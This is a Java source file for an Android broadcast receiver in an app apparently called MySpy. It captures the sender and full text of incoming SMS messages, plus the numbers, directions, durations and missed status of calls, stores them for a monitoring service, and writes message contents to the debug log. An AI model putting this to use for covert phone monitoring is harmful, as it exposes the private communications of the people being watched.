package com.myspy.myspyandroid;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Debug;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.myspy.myspyandroid.variables.CallInfo;
import com.myspy.myspyandroid.variables.SMSInfo;

/**
 * Created by Miroslav Murin on 28.11.2016.
 */

public class ServiceReceiver extends BroadcastReceiver {

    private boolean ringing = true,start = false, outgoing = false;
    private long Stime = 0,Etime;
    private String number = "";


    @Override
    public void onReceive(Context context, Intent intent) {

        try {

            Log.d("Service", "Broadcast received something: " + intent.getAction());
            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Log.d("BROADCAST", "Received");

                Bundle intentExtras = intent.getExtras();

                if (intentExtras != null) {

                    Object[] sms = (Object[]) intentExtras.get("pdus");

                    for (int i = 0; i < sms.length; ++i) {


                        SmsMessage smsMessage;


                        if (Build.VERSION.SDK_INT >= 19) { //KITKAT
                            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                            smsMessage = msgs[0];
                        } else {
                            Object pdus[] = (Object[]) intentExtras.get("pdus");
                            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[0]);
                        }

                        String phone = smsMessage.getOriginatingAddress();
                        String message = smsMessage.getMessageBody().toString();

                        if (MySpyService.serviceSettings.MonitorSMS)
                            MySpyService.serviceVariables.SMSList.add(new SMSInfo(phone, message, SMSInfo.GetCurrentTime()));

                        MySpyService.specialVariables.SMSReceivedAvg++;

                        //Toast.makeText(context, phone + ": " + message, Toast.LENGTH_SHORT).show();
                        Log.d("SMSBROADCAST", "Phone: " + phone + "     Message: " + message);
                    }
                }

            } else if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                Log.d("BROADCAST", "Outgoing call to: " + intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
                start = true;
                outgoing = true;
                Stime = System.currentTimeMillis();
                number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            } else if (intent.getAction().equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                //OFFHOOK IDLE RINGING
                if (state.equals("OFFHOOK")) {
                    if (!start) {
                        start = true;
                        outgoing = false;
                        Stime = System.currentTimeMillis();
                    }
                } else if (state.equals("RINGING")) {
                    ringing = true;
                    number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    Log.d("Ringing", "" + intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER));
                } else if (state.equals("IDLE")) { //OFFHOOK IDLE
                    if (start) {
                        Etime = System.currentTimeMillis();

                        if (MySpyService.serviceSettings.MonitorCalls)
                            MySpyService.serviceVariables.CallList.add(new CallInfo(number, outgoing, (int) ((Etime - Stime) / 1000), CallInfo.GetCurrentTime()));

                        start = false;
                        ringing = false;

                        if (outgoing)
                            MySpyService.specialVariables.CallTimeWeekOUT += (int) ((Etime - Stime) / 1000);
                        else
                            MySpyService.specialVariables.CallTimeWeekIN += (int) ((Etime - Stime) / 1000);

                        Log.d("New Call added", "Number: " + number + "  Outgoing: " + outgoing + "  Time: " + (int) ((Etime - Stime) / 1000));
                    } else {
                        if (ringing) {
                            if (MySpyService.serviceSettings.MonitorCalls)
                                MySpyService.serviceVariables.CallList.add(new CallInfo(number, CallInfo.GetCurrentTime()));
                            Log.d("New Missed Call added", "MISSED Number: " + number);
                            ringing = false;
                        }
                    }
                }
                Log.d("BROADCAST", "call state changed....: " + state);
            }

        }catch (Exception ex)
        {
            Log.d("ErrorServiceReceiver",""+ex);
        }

    }

}
